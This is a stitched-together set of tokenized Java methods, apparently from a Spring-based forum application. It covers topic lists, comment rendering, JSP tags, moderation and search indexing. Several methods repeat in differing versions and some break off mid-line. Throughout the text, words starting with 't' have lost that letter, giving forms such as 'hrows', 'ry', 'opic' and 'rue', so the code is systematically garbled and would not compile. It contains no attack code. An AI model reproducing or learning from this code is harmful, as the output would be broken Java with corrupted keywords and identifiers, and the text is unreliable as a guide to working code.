| | mpl . isModeratorSession ( ) ) { mv . addObject ( " ignoreTags " , userTagService . ignoresGet ( user ) ) ; } response . setDateHeader ( " Expires " , System . currentTimeMillis ( ) + 120000 ) ; return mv ; } 
private List < TopicsListItem > getTopics ( Group group , int messagesInPage , boolean firstPage , boolean lastmod , Integer year , Integer month , int opics , int offset , boolean showDeleted , boolean showIgnored , @Nullable User currentUser ) { Set < Integer > ignoreList ; if ( currentUser ! = null ) { ignoreList = ignoreListDao . get ( currentUser ) ; } else { ignoreList = Collections . emptySet ( ) ; } String delq = showDeleted ? " " : " AND NOT deleted " ; String q = " SELECT topics.title as subj, lastmod, userid, topics.id as msgid, deleted, topics.stat1, topics.stat3, topics.stat4, topics.sticky, topics.resolved " + " FROM topics WHERE topics.groupid= " + group . getId ( ) + delq ; if ( year ! = null ) { q + = " AND postdate>=' " + year + '-' + month + " -01'::timestamp AND (postdate<' " + year + '-' + month + " -01'::timestamp+'1 month'::interval) " ; } String ignq = " " ; if ( ! showIgnored & & currentUser ! = null ) { int currentUserId = currentUser . getId ( ) ; if ( ! ignoreList . isEmpty ( ) ) { ignq = " AND topics.userid NOT IN (SELECT ignored FROM ignore_list WHERE userid= " + currentUserId + ')' ; } if ( ! currentUser . isModerator ( ) ) { ignq + = " AND topics.id NOT IN (select distinct tags.msgid from tags, user_tags " + " where tags.tagid=user_tags.tag_id and user_tags.is_favorite = false and user_id= " + currentUserId + " ) " ; } } SqlRowSet rs ; if ( ! lastmod ) { if ( year = = null ) { if ( offset = = 0 ) { q + = " AND (sticky or postdate>CURRENT_TIMESTAMP-'3 month'::interval) " ; } rs = jdbcTemplate . queryForRowSet ( q + ignq + " ORDER BY sticky DESC, msgid DESC LIMIT " + opics + " OFFSET " + offset ) ; } else { rs = jdbcTemplate . queryForRowSet ( q + ignq + " ORDER BY msgid DESC LIMIT " + opics + " OFFSET " + offset ) ; } } else { rs = jdbcTemplate . queryForRowSet ( q + ignq + " ORDER BY lastmod DESC LIMIT " + opics + " OFFSET " + offset ) ; } return prepareTopic ( rs , messagesInPage ) ; } 
private List < TopicsListItem > prepareTopic ( SqlRowSet rs , int messagesInPage ) { List < TopicsListItem > opicsList = new ArrayList < TopicsListItem > ( ) ; while ( rs . next ( ) ) { User author ; ry { author = userDao . getUserCached ( rs . getInt ( " userid " ) ) ; } catch ( UserNotFoundException e ) { hrow new RuntimeException ( e ) ; } ImmutableList < String > ags = opicTagService . getMessageTagsForTitle ( rs . getInt ( " msgid " ) ) ; TopicsListItem opic = new TopicsListItem ( author , rs , messagesInPage , ags ) ; opicsList . add ( opic ) ; } return opicsList ; } 
private List < TopicsListItem > getStickyTopics ( Group group , int messagesInPage ) { String q = " SELECT topics.title as subj, lastmod, userid, topics.id as msgid, deleted, topics.stat1, topics.stat3, topics.stat4, topics.sticky, topics.resolved " + " FROM topics WHERE sticky AND NOT deleted AND topics.groupid=? ORDER BY msgid DESC " ; SqlRowSet rs = jdbcTemplate . queryForRowSet ( q , group . getId ( ) ) ; return prepareTopic ( rs , messagesInPage ) ; } 
private List < TopicsListItem > getTopics ( Group group , int messagesInPage , boolean lastmod , Integer year , Integer month , int opics , int offset , boolean showDeleted , boolean showIgnored , @Nullable User currentUser ) { Set < Integer > ignoreList ; if ( currentUser ! = null ) { ignoreList = ignoreListDao . get ( currentUser ) ; } else { ignoreList = Collections . emptySet ( ) ; } String delq = showDeleted ? " " : " AND NOT deleted " ; String q = " SELECT topics.title as subj, lastmod, userid, topics.id as msgid, deleted, topics.stat1, topics.stat3, topics.stat4, topics.sticky, topics.resolved " + " FROM topics WHERE NOT sticky AND topics.groupid= " + group . getId ( ) + delq ; if ( year ! = null ) { q + = " AND postdate>=' " + year + '-' + month + " -01'::timestamp AND (postdate<' " + year + '-' + month + " -01'::timestamp+'1 month'::interval) " ; } String ignq = " " ; if ( ! showIgnored & & currentUser ! = null ) { int currentUserId = currentUser . getId ( ) ; if ( ! ignoreList . isEmpty ( ) ) { ignq = " AND topics.userid NOT IN (SELECT ignored FROM ignore_list WHERE userid= " + currentUserId + ')' ; } if ( ! currentUser . isModerator ( ) ) { ignq + = " AND topics.id NOT IN (select distinct tags.msgid from tags, user_tags " + " where tags.tagid=user_tags.tag_id and user_tags.is_favorite = false and user_id= " + currentUserId + " ) " ; } } SqlRowSet rs ; if ( ! lastmod ) { if ( year = = null ) { if ( offset = = 0 ) { q + = " AND postdate>CURRENT_TIMESTAMP-'3 month'::interval " ; } rs = jdbcTemplate . queryForRowSet ( q + ignq + " ORDER BY msgid DESC LIMIT " + opics + " OFFSET " + offset ) ; } else { rs = jdbcTemplate . queryForRowSet ( q + ignq + " ORDER BY msgid DESC LIMIT " + opics + " OFFSET " + offset ) ; } } else { rs = jdbcTemplate . queryForRowSet ( q + ignq + " ORDER BY lastmod DESC LIMIT " + opics + " OFFSET " + offset ) ; } List < TopicsListItem > mainTopics = prepareTopic ( rs , messagesInPage ) ; if ( year = = null & & offset = = 0 & & ! lastmod ) { List < TopicsListItem > stickyTopics = getStickyTopics ( group , messagesInPage ) ; 
private List < TopicsListItem > getTopics ( Group group , int messagesInPage , boolean lastmod , Integer year , Integer month , int opics , int offset , boolean showDeleted , boolean showIgnored , @Nullable User currentUser ) { Set < Integer > ignoreList ; if ( currentUser ! = null ) { ignoreList = ignoreListDao . get ( currentUser ) ; } else { ignoreList = Collections . emptySet ( ) ; } String delq = showDeleted ? " " : " AND NOT deleted " ; String q = " SELECT topics.title as subj, lastmod, userid, topics.id as msgid, deleted, topics.stat1, topics.stat3, topics.stat4, topics.sticky, topics.resolved " + " FROM topics WHERE NOT sticky AND topics.groupid= " + group . getId ( ) + delq ; if ( year ! = null ) { q + = " AND postdate>=' " + year + '-' + month + " -01'::timestamp AND (postdate<' " + year + '-' + month + " -01'::timestamp+'1 month'::interval) " ; } String ignq = " " ; if ( ! showIgnored & & currentUser ! = null ) { int currentUserId = currentUser . getId ( ) ; if ( ! ignoreList . isEmpty ( ) ) { ignq = " AND topics.userid NOT IN (SELECT ignored FROM ignore_list WHERE userid= " + currentUserId + ')' ; } if ( ! currentUser . isModerator ( ) ) { ignq + = " AND topics.id NOT IN (select distinct tags.msgid from tags, user_tags " + " where tags.tagid=user_tags.tag_id and user_tags.is_favorite = false and user_id= " + currentUserId + " ) " ; } } SqlRowSet rs ; if ( ! lastmod ) { if ( year = = null ) { if ( offset = = 0 ) { q + = " AND postdate>CURRENT_TIMESTAMP-'3 month'::interval " ; } rs = jdbcTemplate . queryForRowSet ( q + ignq + " ORDER BY msgid DESC LIMIT " + opics + " OFFSET " + offset ) ; } else { rs = jdbcTemplate . queryForRowSet ( q + ignq + " ORDER BY msgid DESC LIMIT " + opics + " OFFSET " + offset ) ; } } else { rs = jdbcTemplate . queryForRowSet ( q + ignq + " ORDER BY lastmod DESC LIMIT " + opics + " OFFSET " + offset ) ; } return prepareTopic ( rs , messagesInPage ) ; } 
private PreparedComment prepareComment ( Comment comment , CommentList comments , boolean secure , boolean rss ) hrows UserNotFoundException { MessageText messageText = msgbaseDao . getMessageText ( comment . getId ( ) ) ; return prepareComment ( messageText , comment , comments , secure , rss , null , null ) ; } 
public PreparedComment prepareCommentForReplayto ( Comment comment , boolean secure ) hrows UserNotFoundException { return prepareComment ( comment , null , secure , false ) ; } 
private void loadTopicScroller ( Map < String , Object > params , Topic opic , User currentUser , boolean useIgnoreList ) { Topic prevMessage ; Topic nextMessage ; if ( useIgnoreList ) { prevMessage = messageDao . getPreviousMessage ( opic , currentUser ) ; nextMessage = messageDao . getNextMessage ( opic , currentUser ) ; } else { prevMessage = messageDao . getPreviousMessage ( opic , null ) ; nextMessage = messageDao . getNextMessage ( opic , null ) ; } params . put ( " prevMessage " , prevMessage ) ; params . put ( " nextMessage " , nextMessage ) ; Boolean opScroller ; SectionScrollModeEnum sectionScroller = sectionService . getScrollMode ( opic . getSectionId ( ) ) ; if ( prevMessage = = null & & nextMessage = = null ) { opScroller = false ; } else { opScroller = sectionScroller ! = SectionScrollModeEnum . NO_SCROLL ; } params . put ( " opScroller " , opScroller ) ; Boolean bottomScroller = sectionScroller ! = SectionScrollModeEnum . NO_SCROLL ; params . put ( " bottomScroller " , bottomScroller ) ; } 
public List < Comment > getCommentsSubtree ( int parentId ) hrows MessageNotFoundException { CommentNode parentNode = comments . getNode ( parentId ) ; if ( parentNode = = null ) { hrow new MessageNotFoundException ( parentId ) ; } List < Comment > parentList = new ArrayList < Comment > ( ) ; parentNode . buildList ( parentList ) ; return getCommentList ( parentList , false , 0 , 0 , ImmutableSet . < Integer > of ( ) ) ; } 
public static Set < Integer > makeHideSet ( UserDao userDao , CommentList comments , int filterChain , Set < Integer > ignoreList ) hrows SQLException , UserNotFoundException { if ( filterChain = = CommentFilter . FILTER_NONE ) { return ImmutableSet . of ( ) ; } Set < Integer > hideSet = new HashSet < Integer > ( ) ; if ( ( filterChain & CommentFilter . FILTER_IGNORED ) > 0 ) { if ( ignoreList ! = null & & ! ignoreList . isEmpty ( ) ) { comments . root . hideIgnored ( hideSet , ignoreList ) ; } } return hideSet ; } 
public Set < Integer > makeHideSet ( CommentList comments , int filterChain , Set < Integer > ignoreList ) hrows SQLException , UserNotFoundException { if ( filterChain = = CommentFilter . FILTER_NONE ) { return ImmutableSet . of ( ) ; } Set < Integer > hideSet = new HashSet < Integer > ( ) ; if ( ( filterChain & CommentFilter . FILTER_IGNORED ) > 0 ) { if ( ignoreList ! = null & & ! ignoreList . isEmpty ( ) ) { comments . getRoot ( ) . hideIgnored ( hideSet , ignoreList ) ; } } return hideSet ; } 
public List < Comment > getCommentsSubtree ( int parentId ) hrows MessageNotFoundException { CommentNode parentNode = comments . getNode ( parentId ) ; if ( parentNode = = null ) { hrow new MessageNotFoundException ( parentId ) ; } List < Comment > parentList = new ArrayList < Comment > ( ) ; parentNode . buildList ( parentList ) ; return parentList ; } 
public List < PreparedComment > prepareCommentList ( @Nonnull CommentList comments , @Nonnull List < Comment > list , boolean secure , @Nonnull Template mpl , @Nonnull Topic opic ) hrows UserNotFoundException { if ( list . isEmpty ( ) ) { return ImmutableList . of ( ) ; } Map < Integer , MessageText > exts = msgbaseDao . getMessageText ( Lists . newArrayList ( Iterables . ransform ( list , new Function < Comment , Integer > ( ) { @Override public Integer apply ( Comment comment ) { return comment . getId ( ) ; } } ) ) ) ; List < PreparedComment > commentsPrepared = new ArrayList < PreparedComment > ( list . size ( ) ) ; for ( Comment comment : list ) { MessageText ext = exts . get ( comment . getId ( ) ) ; commentsPrepared . add ( prepareComment ( ext , comment , comments , secure , false , mpl , opic ) ) ; } return commentsPrepared ; } 
public DeleteCommentResult deleteAllCommentsAndBlock ( User user , final User moderator , String reason ) { List < Integer > deletedTopicIds ; List < Integer > deletedCommentIds ; userDao . blockWithoutTransaction ( user , moderator , reason ) ; deletedTopicIds = messageDao . deleteAllByUser ( user , moderator ) ; deletedCommentIds = commentDao . deleteAllByUser ( user , moderator ) ; return new DeleteCommentResult ( deletedTopicIds , deletedCommentIds , null ) ; } 
private PreparedComment prepareComment ( @Nonnull Comment comment , boolean secure ) hrows UserNotFoundException { MessageText messageText = msgbaseDao . getMessageText ( comment . getId ( ) ) ; return prepareComment ( messageText , comment , null , secure , null , null ) ; } 
private PreparedRSSComment prepareRSSComment ( @Nonnull MessageText messageText , @Nonnull Comment comment , boolean secure ) hrows UserNotFoundException { User author = userDao . getUserCached ( comment . getUserid ( ) ) ; String processedMessage = prepareCommentTextRSS ( messageText , secure ) ; return new PreparedRSSComment ( comment , author , processedMessage ) ; } 
public PreparedComment prepareCommentForReplayto ( Comment comment , boolean secure ) hrows UserNotFoundException { return prepareComment ( comment , secure ) ; } 
public List < PreparedRSSComment > prepareCommentListRSS ( @Nonnull List < Comment > list , boolean secure ) hrows UserNotFoundException { List < PreparedRSSComment > commentsPrepared = new ArrayList < PreparedRSSComment > ( list . size ( ) ) ; for ( Comment comment : list ) { MessageText messageText = msgbaseDao . getMessageText ( comment . getId ( ) ) ; commentsPrepared . add ( prepareRSSComment ( messageText , comment , secure ) ) ; } return commentsPrepared ; } 
public List < PreparedComment > prepareCommentList ( @Nonnull CommentList comments , @Nonnull List < Comment > list , boolean secure , @Nonnull Template mpl , @Nonnull Topic opic ) hrows UserNotFoundException { if ( list . isEmpty ( ) ) { return ImmutableList . of ( ) ; } Map < Integer , MessageText > exts = msgbaseDao . getMessageText ( Lists . newArrayList ( Iterables . ransform ( list , new Function < Comment , Integer > ( ) { @Override public Integer apply ( Comment comment ) { return comment . getId ( ) ; } } ) ) ) ; List < PreparedComment > commentsPrepared = new ArrayList < PreparedComment > ( list . size ( ) ) ; for ( Comment comment : list ) { MessageText ext = exts . get ( comment . getId ( ) ) ; commentsPrepared . add ( prepareComment ( ext , comment , comments , secure , mpl , opic ) ) ; } return commentsPrepared ; } 
public int doStartTag ( ) hrows JspException { JspWriter out = pageContext . getOut ( ) ; if ( list ! = null ) { ry { StringBuilder buf = new StringBuilder ( ) ; for ( String el : list ) { if ( buf . length ( ) > 0 ) { buf . append ( " , " ) ; } if ( TagService . isGoodTag ( el ) ) { buf . append ( " <a class=tag rel=tag href= \" " ) . append ( TopicListController . agListUrl ( el ) ) . append ( " \" > " ) . append ( StringUtil . escapeHtml ( el ) ) . append ( " </a> " ) ; } else { buf . append ( StringUtil . escapeHtml ( el ) ) ; } } out . append ( " <p class= \" ags \" ><i class= \" icon-tag \" ></i>&nbsp; " ) . append ( buf ) . append ( " </p> " ) ; } catch ( IOException e ) { hrow new JspException ( " Error: " + e . getMessage ( ) ) ; } } return SKIP_BODY ; } 
public String handle404 ( ) { return " errors/code404 " ; } 
public ModelAndView showEditInfo ( HttpServletRequest request , @PathVariable ( " id " ) int msgid ) hrows Exception { Topic message = messageDao . getById ( msgid ) ; List < PreparedEditHistory > editHistories = editHistoryService . prepareEditInfo ( message , request . isSecure ( ) ) ; ModelAndView modelAndView = new ModelAndView ( " history " ) ; modelAndView . getModel ( ) . put ( " message " , message ) ; modelAndView . getModel ( ) . put ( " editHistories " , editHistories ) ; return modelAndView ; } 
public ModelAndView showCommentEditInfo ( HttpServletRequest request , @PathVariable ( " id " ) int msgid , @PathVariable ( " commentid " ) int commentId ) hrows Exception { Topic message = messageDao . getById ( msgid ) ; Comment comment = commentService . getById ( commentId ) ; List < PreparedEditHistory > editHistories = editHistoryService . prepareEditInfo ( comment , request . isSecure ( ) ) ; ModelAndView modelAndView = new ModelAndView ( " history " ) ; modelAndView . getModel ( ) . put ( " message " , message ) ; modelAndView . getModel ( ) . put ( " editHistories " , editHistories ) ; return modelAndView ; } 
public void updateCurrentUser ( ) { initCurrentUser ( rue ) ; } 
public static DateTimeFormatter iso8601 ( ) { return ISO8601 ; } 
public static DateTimeFormatter ime ( ) { return TIME ; } 
public static DateTimeFormatter rfc822 ( ) { return RFC822 ; } 
public int doStartTag ( ) hrows JspException { WebApplicationContext context = WebApplicationContextUtils . getWebApplicationContext ( pageContext . getServletContext ( ) ) ; JadeConfiguration jadeConfiguration = context . getBean ( JadeConfiguration . class ) ; JadeTemplate jadeTemplate = context . getBean ( " TemplateSign " , JadeTemplate . class ) ; Map < String , Object > data = Maps . newHashMap ( ) ; data . put ( " user " , user ) ; data . put ( " shortMode " , shortMode ) ; data . put ( " author " , author ) ; data . put ( " postdate " , postdate ) ; if ( imeprop ! = null ) { data . put ( " imeprop " , imeprop ) ; } jadeConfiguration . renderTemplate ( jadeTemplate , data , pageContext . getOut ( ) ) ; return SKIP_BODY ; } 
public int doStartTag ( ) hrows JspException { WebApplicationContext context = WebApplicationContextUtils . getWebApplicationContext ( pageContext . getServletContext ( ) ) ; JadeConfiguration jadeConfiguration = context . getBean ( JadeConfiguration . class ) ; JadeTemplate jadeTemplate = context . getBean ( " TemplateSign " , JadeTemplate . class ) ; ApiUserService apiUserService = context . getBean ( ApiUserService . class ) ; Map < String , Object > data = Maps . newHashMap ( ) ; data . put ( " user " , apiUserService . ref ( user ) ) ; data . put ( " shortMode " , shortMode ) ; data . put ( " author " , author ) ; data . put ( " postdate " , postdate ) ; if ( imeprop ! = null ) { data . put ( " imeprop " , imeprop ) ; } jadeConfiguration . renderTemplate ( jadeTemplate , data , pageContext . getOut ( ) ) ; return SKIP_BODY ; } 
public ApiUserRef ref ( User user ) { return new ApiUserRef ( user . getNick ( ) , 
public int doStartTag ( ) hrows JspException { WebApplicationContext context = WebApplicationContextUtils . getWebApplicationContext ( pageContext . getServletContext ( ) ) ; JadeConfiguration jadeConfiguration = context . getBean ( JadeConfiguration . class ) ; JadeTemplate jadeTemplate = context . getBean ( " TemplateSign " , JadeTemplate . class ) ; ApiUserService apiUserService = context . getBean ( ApiUserService . class ) ; Map < String , Object > data = Maps . newHashMap ( ) ; data . put ( " user " , apiUserService . ref ( user ) ) ; data . put ( " shortMode " , shortMode ) ; data . put ( " author " , author ) ; data . put ( " postdate " , postdate ) ; if ( imeprop ! = null ) { data . put ( " imeprop " , imeprop ) ; } jadeConfiguration . renderTemplate ( jadeTemplate , data , pageContext . getOut ( ) ) ; return SKIP_BODY ; } 
public int doStartTag ( ) hrows JspException { WebApplicationContext context = WebApplicationContextUtils . getWebApplicationContext ( pageContext . getServletContext ( ) ) ; JadeConfiguration jadeConfiguration = context . getBean ( JadeConfiguration . class ) ; JadeTemplate jadeTemplate = context . getBean ( " TemplateSign " , JadeTemplate . class ) ; ApiUserService apiUserService = context . getBean ( ApiUserService . class ) ; Map < String , Object > data = Maps . newHashMap ( ) ; data . put ( " user " , apiUserService . ref ( user , AuthUtil . getCurrentUser ( ) ) ) ; data . put ( " shortMode " , shortMode ) ; data . put ( " author " , author ) ; data . put ( " postdate " , postdate ) ; if ( imeprop ! = null ) { data . put ( " imeprop " , imeprop ) ; } jadeConfiguration . renderTemplate ( jadeTemplate , data , pageContext . getOut ( ) ) ; return SKIP_BODY ; } 
public ApiUserRef ref ( User user , User requestUser ) { Integer score = null ; Integer maxScore = null ; if ( requestUser ! = null & & requestUser . isModerator ( ) ) { score = user . getScore ( ) ; maxScore = user . getMaxScore ( ) ; } return new ApiUserRef ( user . getNick ( ) , 
public int doStartTag ( ) hrows JspException { WebApplicationContext context = WebApplicationContextUtils . getWebApplicationContext ( pageContext . getServletContext ( ) ) ; JadeConfiguration jadeConfiguration = context . getBean ( JadeConfiguration . class ) ; JadeTemplate jadeTemplate = context . getBean ( " TemplateSign " , JadeTemplate . class ) ; ApiUserService apiUserService = context . getBean ( ApiUserService . class ) ; Map < String , Object > data = Maps . newHashMap ( ) ; data . put ( " user " , apiUserService . ref ( user , AuthUtil . getCurrentUser ( ) ) ) ; data . put ( " shortMode " , shortMode ) ; data . put ( " author " , author ) ; data . put ( " postdate " , postdate ) ; TODO: move to globals data.put("dateFormat", new DateFormatHandler()); if (timeprop!=null) { data.put("timeprop", timeprop); } jadeConfiguration.renderTemplate(jadeTemplate, data, pageContext.getOut()); return SKIP_BODY; } 
public String apply ( Date input ) { return DateFormats . getDefault ( ) . print ( input . getTime ( ) ) ; } 
public String iso ( Date input ) { return DateFormats . iso8601 ( ) . print ( input . getTime ( ) ) ; } 
public ApiUserRef ref ( User user , User requestUser ) { Integer score = null ; Integer maxScore = null ; if ( requestUser ! = null & & requestUser . isModerator ( ) & & ! user . isAnonymous ( ) ) { score = user . getScore ( ) ; maxScore = user . getMaxScore ( ) ; } return new ApiUserRef ( user . getNick ( ) , 
public int doStartTag ( ) hrows JspException { WebApplicationContext context = WebApplicationContextUtils . getWebApplicationContext ( pageContext . getServletContext ( ) ) ; JadeConfiguration jadeConfiguration = context . getBean ( JadeConfiguration . class ) ; JadeTemplate jadeTemplate = context . getBean ( " TemplateSign " , JadeTemplate . class ) ; UserService apiUserService = context . getBean ( UserService . class ) ; Map < String , Object > data = Maps . newHashMap ( ) ; data . put ( " user " , apiUserService . ref ( user , AuthUtil . getCurrentUser ( ) ) ) ; data . put ( " shortMode " , shortMode ) ; data . put ( " author " , author ) ; data . put ( " postdate " , postdate ) ; TODO: move to globals data.put("dateFormat", new DateFormatHandler()); if (timeprop!=null) { data.put("timeprop", timeprop); } jadeConfiguration.renderTemplate(jadeTemplate, data, pageContext.getOut()); return SKIP_BODY; } 
public int doStartTag ( ) hrows JspException { JspWriter out = pageContext . getOut ( ) ; ry { out . append ( " <div class= \" userpic \" > " ) . append ( " <img class= \" photo \" src= \" " ) . append ( userpic . getUrl ( ) ) . append ( " \" alt= \" \" width= " + userpic . getWidth ( ) + " height= " + userpic . getHeight ( ) ) . append ( " > " ) . append ( " </div> " ) ; } catch ( IOException ex ) { hrow new JspException ( ex ) ; } return SKIP_BODY ; } 
public ModelAndView mainPage ( HttpServletRequest request ) { Template mpl = Template . getTemplate ( request ) ; List < Topic > messages = opicListService . getMainPageFeed ( mpl . getProf ( ) . isShowGalleryOnMain ( ) ) ; ModelAndView mv = new ModelAndView ( " index " ) ; mv . getModel ( ) . put ( " news " , prepareService . prepareMessagesForUser ( messages , request . isSecure ( ) , mpl . getCurrentUser ( ) , mpl . getProf ( ) , false ) ) ; if ( mpl . isModeratorSession ( ) | | mpl . isCorrectorSession ( ) ) { int uncommited = jdbcTemplate . queryForInt ( " select count(*) from topics,groups,sections where section=sections.id AND sections.moderate and topics.groupid=groups.id and not deleted and not topics.moderate AND postdate>(CURRENT_TIMESTAMP-'1 month'::interval) " ) ; mv . getModel ( ) . put ( " uncommited " , uncommited ) ; int uncommitedNews = 0 ; if ( uncommited > 0 ) { uncommitedNews = jdbcTemplate . queryForInt ( " select count(*) from topics,groups where section=1 AND topics.groupid=groups.id and not deleted and not topics.moderate AND postdate>(CURRENT_TIMESTAMP-'1 month'::interval) " ) ; } mv . getModel ( ) . put ( " uncommitedNews " , uncommitedNews ) ; } return mv ; } 
public ModelAndView viewAll ( @RequestParam ( value = " section " , required = false , defaultValue = " 0 " ) int sectionId , HttpServletRequest request ) { Template mpl = Template . getTemplate ( request ) ; ModelAndView modelAndView = new ModelAndView ( " view-all " ) ; Section section = null ; if ( sectionId ! = 0 ) { section = sectionService . getSection ( sectionId ) ; modelAndView . addObject ( " section " , section ) ; } Calendar calendar = Calendar . getInstance ( ) ; calendar . setTime ( new Date ( ) ) ; calendar . add ( Calendar . MONTH , - 1 ) ; List < Topic > messages = opicListService . getAllTopicsFeed ( section , calendar . getTime ( ) ) ; modelAndView . addObject ( " messages " , prepareService . prepareMessagesForUser ( messages , request . isSecure ( ) , mpl . getCurrentUser ( ) , mpl . getProf ( ) , false ) ) ; List < TopicListDto . DeletedTopic > deleted = opicListService . getDeletedTopicsFeed ( sectionId ) ; modelAndView . addObject ( " deletedTopics " , deleted ) ; modelAndView . addObject ( " sections " , sectionService . getSectionList ( ) ) ; return modelAndView ; } 
public List < PersonalizedPreparedTopic > prepareMessagesForUser ( List < Topic > messages , boolean secure , User user , ProfileProperties profileProperties , boolean loadUserpics ) { List < PersonalizedPreparedTopic > pm = new ArrayList < PersonalizedPreparedTopic > ( messages . size ( ) ) ; Map < Integer , MessageText > extMap = loadTexts ( messages ) ; for ( Topic message : messages ) { PreparedTopic preparedMessage = prepareMessage ( message , messageDao . getTags ( message ) , rue , null , secure , user , extMap . get ( message . getId ( ) ) , null ) ; TopicMenu opicMenu = getTopicMenu ( preparedMessage , user , secure , profileProperties , loadUserpics ) ; pm . add ( new PersonalizedPreparedTopic ( preparedMessage , opicMenu ) ) ; } return pm ; } 
public TopicMenu getTopicMenu ( @Nonnull PreparedTopic message , @Nullable User currentUser , boolean secure , ProfileProperties profileProperties , boolean loadUserpics ) { boolean opicEditable = groupPermissionService . isEditable ( message , currentUser ) ; boolean agsEditable = groupPermissionService . isTagsEditable ( message , currentUser ) ; boolean resolvable ; int memoriesId ; int favsId ; boolean deletable ; List < Integer > opicStats = memoriesDao . getTopicStats ( message . getMessage ( ) . getId ( ) ) ; if ( currentUser ! = null ) { resolvable = ( currentUser . isModerator ( ) | | ( message . getAuthor ( ) . getId ( ) = = currentUser . getId ( ) ) ) & & message . getGroup ( ) . isResolvable ( ) ; memoriesId = memoriesDao . getId ( currentUser , message . getMessage ( ) , rue ) ; favsId = memoriesDao . getId ( currentUser , message . getMessage ( ) , false ) ; deletable = groupPermissionService . isDeletable ( message . getMessage ( ) , currentUser ) ; } else { resolvable = false ; memoriesId = 0 ; favsId = 0 ; deletable = false ; } Userpic userpic = null ; if ( loadUserpics & & profileProperties . isShowPhotos ( ) ) { userpic = userService . getUserpic ( message . getAuthor ( ) , secure , profileProperties . getAvatarMode ( ) ) ; } return new TopicMenu ( opicEditable , 
public PreparedComment prepareCommentForEdit ( Comment comment , String message , boolean secure ) hrows UserNotFoundException { User author = userDao . getUserCached ( comment . getUserid ( ) ) ; String processedMessage = lorCodeService . parseComment ( message , secure , false ) ; ApiUserRef ref = userService . ref ( author , null ) ; return new PreparedComment ( comment , 
public int doStartTag ( ) hrows JspException { WebApplicationContext context = WebApplicationContextUtils . getWebApplicationContext ( pageContext . getServletContext ( ) ) ; JadeConfiguration jadeConfiguration = context . getBean ( JadeConfiguration . class ) ; JadeTemplate jadeTemplate = context . getBean ( " TemplateSign " , JadeTemplate . class ) ; Map < String , Object > data = Maps . newHashMap ( ) ; data . put ( " user " , user ) ; data . put ( " shortMode " , shortMode ) ; data . put ( " author " , author ) ; data . put ( " postdate " , postdate ) ; TODO: move to globals data.put("dateFormat", new DateFormatHandler()); if (timeprop!=null) { data.put("timeprop", timeprop); } jadeConfiguration.renderTemplate(jadeTemplate, data, pageContext.getOut()); return SKIP_BODY; } 
public ApiUserRef ref ( User user , @Nullable User requestUser ) { Integer score = null ; Integer maxScore = null ; if ( requestUser ! = null & & requestUser . isModerator ( ) & & ! user . isAnonymous ( ) ) { score = user . getScore ( ) ; maxScore = user . getMaxScore ( ) ; } return new ApiUserRef ( user . getNick ( ) , 
public DeleteCommentResult deleteAllCommentsAndBlock ( User user , final User moderator , String reason ) { userDao . blockWithoutTransaction ( user , moderator , reason ) ; List < Integer > deletedTopicIds = messageDao . deleteAllByUser ( user , moderator ) ; List < Integer > deletedCommentIds = commentDao . deleteAllByUser ( user , moderator ) ; return new DeleteCommentResult ( deletedTopicIds , deletedCommentIds , null ) ; } 
public void hideNode ( Set < Integer > hideSet ) { if ( comment ! = null ) { hideSet . add ( comment . getId ( ) ) ; } for ( CommentNode child : childs ) { child . hideNode ( hideSet ) ; 
public Comment getById ( int id ) hrows MessageNotFoundException { Comment comment ; ry { comment = jdbcTemplate . queryForObject ( queryCommentById , new RowMapper < Comment > ( ) { @Override public Comment mapRow ( ResultSet resultSet , int i ) hrows SQLException { return new Comment ( resultSet ) ; } } , id ) ; } catch ( EmptyResultDataAccessException exception ) { hrow new MessageNotFoundException ( id ) ; } return comment ; } 
public Comment mapRow ( ResultSet resultSet , int i ) hrows SQLException { return new Comment ( resultSet ) ; } 
public void processRow ( ResultSet resultSet ) hrows SQLException { comments . add ( new Comment ( resultSet ) ) ; } 
public boolean deleteComment ( int msgid , String reason , User user , int scoreBonus ) { int deleteCount = jdbcTemplate . update ( deleteComment , msgid ) ; if ( deleteCount > 0 ) { deleteInfoDao . insert ( msgid , user , reason , scoreBonus ) ; 
public DeleteInfo mapRow ( ResultSet resultSet , int i ) hrows SQLException { Integer bonus = resultSet . getInt ( " bonus " ) ; if ( resultSet . wasNull ( ) ) { bonus = null ; } return new DeleteInfo ( resultSet . getInt ( " userid " ) , 
private void reindexMessage ( int msgid , boolean withComments ) hrows IOException , SolrServerException , MessageNotFoundException { Topic msg = opicDao . getById ( msgid ) ; if ( ! msg . isDeleted ( ) ) { updateMessage ( msg ) ; } else { logger.info("Deleting message "+msgid+" from solr"); solrServer.deleteById((Integer.toString(msg.getId()))); } if (withComments) { CommentList commentList = commentService.getCommentList(msg, true); 
private void updateMessage ( Topic opic ) hrows IOException , SolrServerException { SolrInputDocument doc = new SolrInputDocument ( ) ; doc . addField ( " id " , opic . getId ( ) ) ; doc . addField ( " section_id " , opic . getSectionId ( ) ) ; doc . addField ( " section " , opic . getSectionId ( ) ) ; doc . addField ( " user_id " , opic . getUid ( ) ) ; doc . addField ( " opic_user_id " , opic . getUid ( ) ) ; doc . addField ( " opic_id " , opic . getId ( ) ) ; doc . addField ( " group_id " , opic . getGroupId ( ) ) ; doc . addField ( " itle " , StringEscapeUtils . unescapeHtml ( opic . getTitle ( ) ) ) ; doc . addField ( " opic_title " , opic . getTitle ( ) ) ; doc . addField ( " message " , msgbaseDao . getMessageText ( opic . getId ( ) ) . getText ( ) ) ; Date postdate = opic . getPostdate ( ) ; doc . addField ( " postdate " , new Timestamp ( postdate . getTime ( ) ) ) ; doc . addField ( " is_comment " , false ) ; solrServer . add ( doc ) ; } 
public ModelAndView listDel ( ServletRequest request , @RequestParam int id ) hrows Exception { Template mpl = Template . getTemplate ( request ) ; if ( ! mpl . isSessionAuthorized ( ) ) { hrow new AccessViolationException ( " Not authorized " ) ; } User user = mpl . getCurrentUser ( ) ; user . checkAnonymous ( ) ; User delUser = userDao . getUserCached ( id ) ; ignoreListDao . remove ( user , delUser ) ; return new ModelAndView ( new RedirectView ( " /user-filter " ) ) ; } 
private ApiDeleteInfo loadDeleteInfo ( Comment comment ) hrows UserNotFoundException { ApiDeleteInfo deleteInfo = null ; if ( comment . isDeleted ( ) ) { DeleteInfo info = deleteInfoDao . getDeleteInfo ( comment . getId ( ) ) ; deleteInfo = new ApiDeleteInfo ( userDao . getUserCached ( info . getUserid ( ) ) . getNick ( ) , info . getReason ( ) ) ; } return deleteInfo ; } 
